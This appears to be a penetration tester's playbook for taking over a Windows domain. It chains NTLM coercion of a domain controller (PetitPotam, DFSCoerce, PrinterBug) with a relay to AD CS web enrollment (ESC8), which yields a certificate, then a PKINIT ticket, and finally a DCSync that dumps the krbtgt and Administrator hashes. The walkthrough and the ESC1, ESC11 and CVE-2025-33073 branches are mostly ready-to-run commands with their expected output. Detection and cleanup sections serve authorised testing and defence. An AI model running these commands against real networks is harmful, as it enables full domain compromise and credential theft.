---
tags:
  - hack-notes
  - playbook
  - ad
  - adcs
---

# Coercion to ADCS ESC8 to Domain Admin Playbook

> From an unauthenticated or low-priv foothold, relay a coerced Domain Controller machine account to AD CS web enrollment (ESC8), mint a DC certificate, PKINIT to a TGT, UnPAC the NT hash, then DCSync to Domain Admin.

> **Attack graph position**
> **Fed by:** Internal network position (entry); [Edge Device Exploit to Internal Foothold](Edge%20Device%20Exploit%20to%20Internal%20Foothold.md), [IPv6 mitm6 Relay to RBCD Takeover](IPv6%20mitm6%20Relay%20to%20RBCD%20Takeover.md), [Azure AiTM Token Theft to Global Admin](Azure%20AiTM%20Token%20Theft%20to%20Global%20Admin.md) (cloud to on-prem bridge).
> **Feeds into:** [DCSync to Golden Ticket Persistence](DCSync%20to%20Golden%20Ticket%20Persistence.md)
> Full chain map: [Attack Graph](Attack%20Graph.md)

## Scenario at a Glance

| | |
|---|---|
| Goal | Domain Admin / Tier-0 control of the forest |
| Starting position | Unauthenticated on the LAN, or a low-priv domain user (needed for some coercion methods post-patch) |
| End state | DC machine hash recovered, full DCSync, Domain Admin |
| Key techniques | T1557.001 NTLM relay, T1187 forced authentication, T1649 steal/forge certificates, T1003.006 DCSync |
| Prerequisites | An AD CS CA with the Web Enrollment role (certsrv) reachable, SMB signing NOT enforced on the relay path, a coercion primitive that still fires |
| Difficulty | Medium |
| Noise level | Loud (coercion RPC, relay auth, 4886/4887 enrollment, 4768 cert logon) |

## Attack Path

```
[ attacker on LAN ]
        |
   (0) recon: certipy find  ->  is the CA ESC8 (web enrollment) vulnerable?
        |
        |--- YES, HTTP web enrollment present ------------------+
        |                                                       |
   (1) start relay  --->  ntlmrelayx -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController
        |                                                       |
   (2) coerce DC01$  --->  PetitPotam / DFSCoerce / PrinterBug / Coercer  ->  DC01$ auths to relay
        |                                                       |
   (3) relay issues cert for DC01$  ->  base64 cert captured by ntlmrelayx
        |                                                       |
   (4) PKINIT with cert  ->  TGT for DC01$  ->  certipy auth  ->  UnPAC NT hash of DC01$
        |                                                       |
   (5) DCSync as DC01$  ->  krbtgt + Administrator hash  ->  DOMAIN ADMIN
        |
        |--- NO web enrollment ---> branch A: ESC1 (vulnerable template, enroll SAN=DA)
        |--- HTTP disabled, RPC open ---> branch B: ESC11 (relay to ICPR over RPC)
        +--- target unpatched single host ---> branch C: CVE-2025-33073 self-relay to SYSTEM
```

## Prerequisites and Setup

- Linux attack host with Impacket (`ntlmrelayx.py`) and Certipy 5.x (`certipy-ad`). Install current: `pipx install certipy-ad` and `pipx install impacket`.
- Coercion tooling: `Coercer` (p0dalirius, 12 methods), `PetitPotam.py`, `dfscoerce.py`, `printerbug.py`, or NetExec's `coerce_plus` module.
- Network position where the DC can route SMB back to you (same VLAN or a route the SOC will not block).
- Confirm SMB signing is NOT required on the box you relay through. The DC is the victim that authenticates; the CA is the relay target. The DC must reach you, and the path to the CA web endpoint must not enforce EPA.
- Identify the CA host FQDN, the CA common name, and a DC to coerce (`DC01.corp.local`).
- Valid low-priv domain creds help: post-CVE-2021-36942, unauthenticated PetitPotam is patched, so most coercion now needs an authenticated context. PrinterBug/DFSCoerce still fire against default 2019/2022 with a domain account.

## Walkthrough

### Step 0. Enumerate AD CS and confirm ESC8

What and why: before relaying anything, prove a vulnerable enrollment surface exists so you target the right endpoint. Certipy's `find` flags ESC8 (web enrollment + no EPA), ESC1, and ESC11 in one pass.

```bash
# authenticated enum (preferred, richest output)
certipy-ad find -u lowpriv@corp.local -p 'Password123' -dc-ip 10.10.10.10 -stdout -vulnerable

# or pull everything to BloodHound/JSON for review
certipy-ad find -u lowpriv@corp.local -p 'Password123' -dc-ip 10.10.10.10 -enabled
```

Success signal: output lists a CA with `Web Enrollment : Enabled` and an `[!] Vulnerabilities` block naming `ESC8`. Note the CA FQDN (e.g. `CA01.corp.local`) and the CA name (e.g. `corp-CA01-CA`).

Decision / branch: if there is no ESC8 but `ESC1` appears, jump to the ESC1 variation in Variations and Pivots. If web enrollment is disabled but the RPC enrollment endpoint shows `Enforce Encryption for Requests : Disabled`, that is ESC11, also below.

### Step 1. Start the relay listener against AD CS web enrollment

What and why: stand up the relay first so a coerced auth lands in a ready handler. Targeting `certfnsh.asp` (the cert finalization page) with `--adcs` makes ntlmrelayx request a cert on behalf of the relayed identity. `--template DomainController` is required when relaying a machine account such as a DC.

```bash
# Impacket ntlmrelayx, classic ESC8 to HTTP web enrollment
impacket-ntlmrelayx -t http://CA01.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController
```

Certipy 5.x has a native relay client that handles HTTP and HTTPS out of the box and is often cleaner:

```bash
# Certipy 5.x relay (HTTP web enrollment / ESC8)
certipy-ad relay -target http://CA01.corp.local -template DomainController
# HTTPS target (5.x supports it natively):
certipy-ad relay -target https://CA01.corp.local -template DomainController
```

Success signal: the listener prints `Servers started, waiting for connections`. Leave it running; the next step drives traffic to it.

Decision / branch: if the CA front end enforces EPA on HTTPS, plain HTTP relay to `certfnsh.asp` usually still works because IIS commonly exposes the cleartext virtual dir. If HTTP is fully removed, go to the ESC11 RPC branch.

### Step 2. Coerce the Domain Controller to authenticate to the relay

What and why: the relay is inert until a privileged account authenticates through it. Coerce the DC machine account (`DC01$`, a member of Domain Controllers, ideal for DCSync) to SMB-auth to your listener IP. Try multiple methods; patch state varies per host.

```bash
# Coercer: fires all supported methods, best first try
coercer coerce -t DC01.corp.local -l 10.10.10.50 \
  -u lowpriv -p 'Password123' -d corp.local

# DFSCoerce (MS-DFSNM), reliable on default 2019/2022
python3 dfscoerce.py -u lowpriv -p 'Password123' -d corp.local 10.10.10.50 DC01.corp.local

# PrinterBug / SpoolSample (MS-RPRN), still active on default configs
python3 printerbug.py corp.local/lowpriv:'Password123'@DC01.corp.local 10.10.10.50

# PetitPotam (MS-EFSRPC), now authenticated post CVE-2021-36942 patch
python3 PetitPotam.py -u lowpriv -p 'Password123' -d corp.local 10.10.10.50 DC01.corp.local
```

Success signal: the coercion tool reports the RPC call returned (often a benign error code that still means the auth was triggered), and within a second or two the relay window shows an inbound SMB connection from `DC01$`.

Decision / branch: if every method returns no inbound auth, the DC may have the relevant patches and signing. Re-aim coercion at a different DC, or pivot to CVE-2025-33073 self-relay (branch C) against an unpatched member host.

### Step 3. Relay issues a certificate for the DC machine account

What and why: the relayed `DC01$` auth drives an enrollment request against the CA. ntlmrelayx / certipy submits it with the DomainController template and captures the issued certificate.

Success signal (Impacket): the relay prints lines like:

```
[*] Authenticating against http://CA01.corp.local as CORP/DC01$ SUCCEED
[*] GOT CERTIFICATE! ID 1337
[*] Writing PKCS#12 certificate to ./DC01.pfx
```

Certipy's relay writes `dc01.pfx` (or prints a base64 cert and saves the `.pfx`). Note the path. If ntlmrelayx prints base64 instead of a pfx, decode it:

```bash
# only if you got raw base64 instead of a .pfx
echo '<base64-blob>' | base64 -d > DC01.pfx
```

Decision / branch: one coercion can produce one cert; if you need a clean retry, restart the listener before re-coercing so state is fresh. If issuance fails with a template error, the CA may not publish DomainController to that requester. Try `-template DomainController` vs `Machine` vs `KerberosAuthentication`, or pivot to ESC1.

### Step 4. PKINIT with the certificate, get a TGT, UnPAC the NT hash

What and why: the pfx is the DC's identity. PKINIT pre-auth turns it into a Kerberos TGT, and Certipy automatically performs UnPAC-the-hash to pull `DC01$`'s NT hash out of the PAC, which is what you need for DCSync.

```bash
# Certipy auth does PKINIT -> TGT (.ccache) and UnPAC -> NT hash in one shot
certipy-ad auth -pfx DC01.pfx -dc-ip 10.10.10.10
```

Success signal:

```
[*] Using principal: dc01$@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc01.ccache'
[*] Got hash for 'dc01$@corp.local': aad3b435b51404eeaad3b435b51404ee:<nthash>
```

Decision / branch: if the KDC rejects PKINIT (older DC without the PKINIT certs, or `KDC_ERR_PADATA_TYPE_NOSUPP`), fall back to the Schannel/LDAP path: use the cert to bind to LDAP and do a Shadow Credentials or RBCD pivot instead of UnPAC. The manual two-step equivalent is `gettgtpkinit.py` to get the TGT and AS-REP key, then `getnthash.py` with that key to recover the hash.

### Step 5. DCSync to Domain Admin

What and why: `DC01$` is a Domain Controller, so its hash grants directory replication rights. Replicate the krbtgt and Administrator secrets to forge a Golden Ticket or to authenticate directly.

```bash
# DCSync with the recovered DC machine hash (pass-the-hash)
impacket-secretsdump -just-dc -hashes :<nthash> 'corp.local/DC01$@10.10.10.10'

# narrow to the crown jewels
impacket-secretsdump -just-dc-user 'CORP\krbtgt' -hashes :<nthash> 'corp.local/DC01$@10.10.10.10'
impacket-secretsdump -just-dc-user 'CORP\Administrator' -hashes :<nthash> 'corp.local/DC01$@10.10.10.10'

# or use the ccache from step 4 directly
export KRB5CCNAME=dc01.ccache
impacket-secretsdump -k -no-pass 'corp.local/DC01$@DC01.corp.local' -just-dc
```

Success signal: `secretsdump` returns the krbtgt hash and `Administrator:500:...` line. Validate Domain Admin:

```bash
nxc smb 10.10.10.10 -u Administrator -H <admin_nthash>
# expect (Pwn3d!) and SYSTEM-level access on the DC
```

Stop here. You hold the proven primitive (DA). Do not deploy persistence beyond what the engagement scope authorizes.

## OPSEC and Detection

- Certificate enrollment is the loudest tell. On the CA, Security log **4886** (certificate services received request) and **4887** (certificate issued) fire for the `DC01$` request from the relay host. The requester IP not matching the DC, and a DomainController cert issued to a host that is not the DC, is the classic anomaly.
- Cert-based logon shows as **4768** (Kerberos TGT requested) with a Certificate Information field populated. A TGT for `DC01$` originating from your attack host IP is a strong signal.
- Coercion generates RPC traffic to MS-EFSRPC/MS-RPRN/MS-DFSNM. EDR and network sensors (e.g. Defender for Identity) flag SpoolSample/PetitPotam-style coercion and the subsequent NTLM relay.
- ntlmrelayx footprint: inbound SMB from a DC to a non-server host, then immediate outbound HTTP enrollment to the CA from that same host. The auth-to-the-CA originating from a workstation IP rather than the DC is the correlate.
- Reduce noise: use a single coercion method instead of Coercer's full spray, target the CA over HTTP directly rather than scanning, and tear down the cert fast (cleanup below). There is no quiet way to enroll a DC cert; this chain is inherently loud, so time it and minimize dwell.

## Cleanup

- Revoke the issued certificate. Have the CA admin (or your authorized escalation contact) revoke by the serial/request ID seen in 4887 / the ntlmrelayx `ID` line. Until revoked, the pfx remains a valid logon credential.
- Delete local artifacts: `DC01.pfx`, `dc01.ccache`, any base64 blobs, secretsdump output files containing hashes.
- If you forged a Golden Ticket or set up RBCD/Shadow Credentials in a fallback path, remove them: clear the `msDS-KeyCredentialLink` you added, delete any attacker computer object, and reset `msDS-AllowedToActOnBehalfOfOtherIdentity` you modified.
- Note the krbtgt was exposed via DCSync. Recommend (do not perform unprompted) a double krbtgt rotation as remediation.
- Unset `KRB5CCNAME` and remove the ccache from the environment.

## Troubleshooting

- No inbound auth after coercion: wrong listener IP, a firewall between DC and you, or the method is patched on that DC. Switch method (DFSCoerce and PrinterBug are the most durable), pick a different DC, and confirm your IP is reachable from the DC.
- `SMB SessionError: STATUS_ACCESS_DENIED` on relay: SMB signing is enforced on the relay path, or you are relaying to a target that requires signing. ESC8 relays SMB auth to HTTP, so signing on the DC side does not block it, but EPA on the CA HTTPS endpoint can. Relay to plain HTTP `certfnsh.asp`.
- Cert issued but PKINIT fails: template lacked Client Authentication EKU, or the DC name in the SAN is wrong. Confirm the template was DomainController/KerberosAuthentication. For `KDC_ERR_PADATA_TYPE_NOSUPP`, the KDC has no PKINIT support, use the LDAP/Schannel fallback.
- `--template` rejected at enrollment: the requester is not permitted that template. Enumerate published templates in step 0 and pick one the machine can enroll (Machine, DomainController, KerberosAuthentication).
- Relay grabs a user instead of the DC: you coerced or caught the wrong principal. Aim coercion explicitly at the DC and drop `--template` only when relaying a user with ESC1.
- Clock skew on PKINIT/Kerberos: sync to the DC, `ntpdate 10.10.10.10` or `faketime`, then retry `certipy-ad auth`.

## Variations and Pivots

### Branch A: ESC1 (vulnerable template, no web enrollment needed)

When `certipy find` flags ESC1 (a template with `Client Authentication` EKU, `Enrollee Supplies Subject`, and low-priv enroll rights), you do not need coercion or relay at all. Request a cert as any account and set the SAN to a Domain Admin.

```bash
# request a cert as a DA via the vulnerable template
certipy-ad req -u lowpriv@corp.local -p 'Password123' -dc-ip 10.10.10.10 \
  -ca corp-CA01-CA -template VulnTemplate -upn administrator@corp.local

# then PKINIT/UnPAC as the DA and DCSync
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

If the CA strips the SAN, add `-sid <DA-SID>` (StrongCertificateBindingEnforcement era) to bind via the certificate SID extension.

### Branch B: ESC11 (relay to ICPR over RPC when HTTP is disabled)

When web enrollment is off but the MS-ICPR RPC interface does not enforce encryption (`Enforce Encryption for Requests : Disabled`), relay the coerced auth to the RPC endpoint instead of HTTP. Coercion (step 2) and the rest of the chain are identical.

```bash
# Certipy 5.x relay to RPC/ICPR
certipy-ad relay -target rpc://CA01.corp.local -ca corp-CA01-CA -template DomainController

# Impacket equivalent
impacket-ntlmrelayx -t rpc://CA01.corp.local -rpc-mode ICPR \
  -icpr-ca-name corp-CA01-CA -smb2support --template DomainController
```

### Branch C: CVE-2025-33073 (reflective Kerberos/NTLM self-relay to SYSTEM)

On hosts missing the June 2025 patch and without SMB signing/EPA, you can relay a coerced auth back to the same machine to get SYSTEM, no second target needed. Register an attacker DNS record whose name marshals to look local, coerce the target to that name, and relay to its own SMB.

```bash
# add an attacker-controlled DNS record (authenticated to DC over LDAP)
# then coerce the target to the crafted name and self-relay
impacket-ntlmrelayx -t smb://TARGET.corp.local -smb2support -socks
# coerce TARGET to the marshalled DNS name pointing at your listener
python3 PetitPotam.py -u lowpriv -p 'Password123' -d corp.local <crafted-name> TARGET.corp.local
```

Patched as of June 10 2025 (Patch Tuesday); only viable against unpatched 2019-2025 / Win10/11 without signing. Use it as an alternate route to a host foothold, then pivot back into the ESC8 chain above.

### Escalating from the end state

With DA and the krbtgt hash you have full forest control: forge Golden Tickets (`ticketer.py`), persist via a DCSync-capable account, or pivot to other domains in the forest via SID history. For lateral spread off the DC, hand the recovered hashes to standard PtH workflows.

## Related

- [Internal Network and Active Directory](../Checklists/Internal%20Network%20and%20Active%20Directory.md)
- [Active Directory and Kerberos](../Cheatsheets/Active%20Directory%20and%20Kerberos.md)
- [NetExec and Impacket](../Cheatsheets/NetExec%20and%20Impacket.md)
- [Windows Privilege Escalation](../Cheatsheets/Windows%20Privilege%20Escalation.md)
- Ariadne
